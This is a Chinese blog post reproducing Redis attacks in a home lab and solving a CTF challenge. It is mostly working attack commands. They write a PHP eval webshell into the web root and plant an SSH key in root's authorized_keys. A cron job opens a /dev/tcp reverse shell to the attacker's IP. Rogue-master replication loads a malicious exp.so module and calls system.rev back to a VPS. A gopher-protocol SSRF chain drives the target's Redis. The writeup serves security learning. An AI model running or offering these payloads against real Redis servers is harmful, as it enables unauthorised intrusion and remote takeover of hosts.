<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="一些Redis漏洞复现"><meta name="keywords" content=""><meta name="author" content="wuyusanhua"><meta name="copyright" content="wuyusanhua"><title>一些Redis漏洞复现 | 雾雨散花</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="雾雨散花" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">复现环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">Redis未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞复现与实际应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%86%99webshell"><span class="toc-number">3.2.1.</span> <span class="toc-text">Redis写webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">3.2.2.</span> <span class="toc-text">Redis写ssh公钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.3.</span> <span class="toc-text">Redis写计划任务</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E8%BF%9C%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">Redis远程主从复制rce漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">4.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AC%E5%9C%B0%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">Redis本地主从复制rce漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">5.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%8E%84%E6%AD%A6%E7%BB%84-SSRF-Me"><span class="toc-number">6.</span> <span class="toc-text">例题-网鼎杯玄武组 SSRF Me</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">wuyusanhua</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">25</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://www.socwall.com/images/wallpapers/98278-5120x2880.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">雾雨散花</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">一些Redis漏洞复现</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-10</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前VNCTF的时候遇到过一道redis的题，这几天想起来了，复现时那题反弹shell也没成功，于是就复现了一些redis的漏洞，做了道例题，学习一下</p>
<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>redis版本：5.0.12</p>
<p>攻击机：kali</p>
<p>靶机：ubuntu18.04</p>
<h1 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>redis没有对连接ip进行限制，直接暴露在公网</li>
<li>redis没有设置登录密码</li>
</ol>
<h2 id="漏洞复现与实际应用"><a href="#漏洞复现与实际应用" class="headerlink" title="漏洞复现与实际应用"></a>漏洞复现与实际应用</h2><p>redil-cli直连就行了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip</span><br></pre></td></tr></table></figure>

<p>重点是连上后怎么用redis来进行攻击，先给出一些redis常用命令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> xz <span class="string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker</span><br><span class="line"><span class="builtin-name">get</span> xz                              # 获取键xz的内容</span><br><span class="line"><span class="builtin-name">SET</span> score 857                       # 设置键score的值为857</span><br><span class="line">INCR score                          # 使用INCR命令将score的值增加1</span><br><span class="line"><span class="builtin-name">GET</span> score                           # 获取键score的内容</span><br><span class="line">keys *                              # 列出当前数据库中所有的键<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> protected-mode <span class="literal">no</span>        # 关闭安全模式</span><br><span class="line"><span class="builtin-name">get</span> anotherkey                      # 获取一个不存在的键的值<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> dir /root/redis          # 设置保存目录<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> dbfilename redis.rdb     # 设置保存文件名<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">get</span> dir                      # 查看保存目录<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">get</span> dbfilename               # 查看保存文件名</span><br><span class="line">save                                # 进行一次备份操作</span><br><span class="line">flushall                            # 删除所有数据</span><br><span class="line">del key                             # 删除键为key的数据</span><br><span class="line">slaveof<span class="built_in"> ip port </span>                    # 设置主从关系</span><br><span class="line">redis-cli -h<span class="built_in"> ip </span>-p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure>

<p>用上面的<code>config set dir dirpath</code>命令修改redis的缓冲文件存储路径，再用<code>config set dbfilename  xxx</code>修改缓冲文件名， 最后用<code>save</code>就会把缓冲文件存到指定路径。</p>
<p>把payload写进缓冲里，再利用这个功能就可以执行各种攻击</p>
<h3 id="Redis写webshell"><a href="#Redis写webshell" class="headerlink" title="Redis写webshell"></a>Redis写webshell</h3><p>在攻击机上连接靶机的redis后，执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[hack]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功在指定目录下生成shell.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220407160455817.png" alt="image-20220407160455817"></p>
<h3 id="Redis写ssh公钥"><a href="#Redis写ssh公钥" class="headerlink" title="Redis写ssh公钥"></a>Redis写ssh公钥</h3><p>首先在攻击机上生成一个ssh公钥，然后把公钥写进reids的缓冲，之后以同样的原理，把缓冲文件的保存路径切换到<code>/root/.ssh</code>，文件名修改为<code>authorized_keys</code>即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh-kegen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h ip -x <span class="built_in">set</span> xxx</span><br><span class="line"></span><br><span class="line">redis-cli -h ip</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>此时已经可以用攻击机ssh直连靶机了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220407161524227.png" alt="image-20220407161524227"></p>
<h3 id="Redis写计划任务"><a href="#Redis写计划任务" class="headerlink" title="Redis写计划任务"></a>Redis写计划任务</h3><p>具体操作过程如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.7</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.80.3/2333 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>这样直接攻击centos是能顺利弹回shell的，但是ubuntu却不行，一是ubuntu不会忽略root文件里面的乱码，二是ubuntu默认使用<code>/bin/dash</code>处理脚本，三是ubuntu要想弹shell还要把root文件权限改成600，手动清除乱码，修改设置后，才能弹回来，感觉实战中基本就不用考虑了</p>
<h1 id="Redis远程主从复制rce漏洞"><a href="#Redis远程主从复制rce漏洞" class="headerlink" title="Redis远程主从复制rce漏洞"></a>Redis远程主从复制rce漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>redis提供了主从模式，把多个redis实例分为一个主机和多个从机，主机负责写，从机负责读，二者存储的数据相同，但读写分离可以大幅度减轻流量压力</p>
<p>在Redis  4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令</p>
<p>简单的说，攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害者(机)上</p>
<p>一般用工具<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a>实施攻击</p>
<h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h2><p>靶机存在未授权漏洞/可以远程登录</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击者ip</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409191431056.png" alt="image-20220409191431056"></p>
<p>工具运行之后可以选择获得一个交互式的shell(interactive shell)或者是反弹shell(reserve shell)，选择反弹shell，并输入攻击机的ip和port，成功反弹</p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409191707483.png" alt="image-20220409191707483"></p>
<h1 id="Redis本地主从复制rce漏洞"><a href="#Redis本地主从复制rce漏洞" class="headerlink" title="Redis本地主从复制rce漏洞"></a>Redis本地主从复制rce漏洞</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>若一个redis服务器绑定了本地登录，此时远程主从复制就失效了，但是还可以配合其它的一些漏洞在本地登录redis，并把攻击机redis设为主机，靶机redis设为从机，通过一些命令从主机同步恶意so文件到从机，然后加载system等模块进来，以达到rce的效果</p>
<h2 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h2><p>有其它漏洞（ssrf等）供攻击者本地登录redis</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先要用到一个工具<a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">Awsome-Redis-Rogue-Server</a>，开启它作为主服务器，默认端口为15000，可以通过<code>-lport</code>命令来改变</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rogue-server.py -v -path exp.so  //这个so文件从redis-rogue-server那里复制来</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409205537890.png" alt="image-20220409205537890"></p>
<p>这里复现就直接在靶机上连redis了，实操中应该是通过某个漏洞连，然后设一下路径，文件名，主机</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof <span class="number">192.168</span><span class="number">.80</span><span class="number">.3</span> <span class="number">15000</span></span><br></pre></td></tr></table></figure>

<p>设好后就可以看到攻击机这边已经开始在同步恶意so文件了</p>
<p><img src="/2022/04/10/%E4%B8%80%E4%BA%9BRedis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220409210201860.png" alt="image-20220409210201860"></p>
<p>检查靶机，找到exp.so</p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210454778.png" alt="image-20220409210454778"></p>
<p>关闭同步，加载exp.so，利用加载好的system模块反弹shell</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">slaveof no <span class="literal">one</span></span><br><span class="line">module <span class="built_in">load</span> ./<span class="built_in">exp</span>.so</span><br><span class="line"><span class="keyword">system</span>.rev <span class="number">192.168</span><span class="number">.80</span><span class="number">.3</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210856446.png" alt="image-20220409210856446"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220409210926346.png" alt="image-20220409210926346"></p>
<h1 id="例题-网鼎杯玄武组-SSRF-Me"><a href="#例题-网鼎杯玄武组-SSRF-Me" class="headerlink" title="例题-网鼎杯玄武组 SSRF Me"></a>例题-网鼎杯玄武组 SSRF Me</h1><p>SSRF + Redis本地主从复制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用<code>http://0.0.0.0/hint.php</code>来绕过访问hint.php（这个点也很经典），得关键信息：<code>redis pass is root</code></p>
<p>知道了密码，接下来利用Goher协议打redis本地主从复制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//首先在vps上面启动Awsome-Redis-Rogue-Server</span><br><span class="line">python3 redis_rogue_server.py -v -path exp.so</span><br><span class="line"></span><br><span class="line">//然后在靶机上登录,修改路径和文件名,设置主机</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config <span class="built_in">set</span> dir /tmp/</span><br><span class="line">config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line">slaveof vps port</span><br><span class="line">quit</span><br><span class="line">//加载模块</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br><span class="line">//关闭同步并反弹shell</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">slaveof NO ONE</span><br><span class="line">system.rev vps port</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>以上payload均要url编码两次，依次输入后，成功反弹shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220410104216186.png" alt="image-20220410104216186"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wuyusanhua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://wuyusanhua2021.github.io/2022/04/10/一些Redis漏洞复现/">https://wuyusanhua2021.github.io/2022/04/10/一些Redis漏洞复现/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/04/15/%E7%BA%A2%E6%98%8E%E8%B0%B72022%E5%A4%8D%E7%8E%B0/"><i class="fa fa-chevron-left">  </i><span>红明谷2022-两道Web复现</span></a></div><div class="next-post pull-right"><a href="/2022/03/26/DASCTF2022-Web/"><span>DASCTF2022三月挑战赛Web复现</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://www.socwall.com/images/wallpapers/98278-5120x2880.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021 - 2022 By wuyusanhua</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>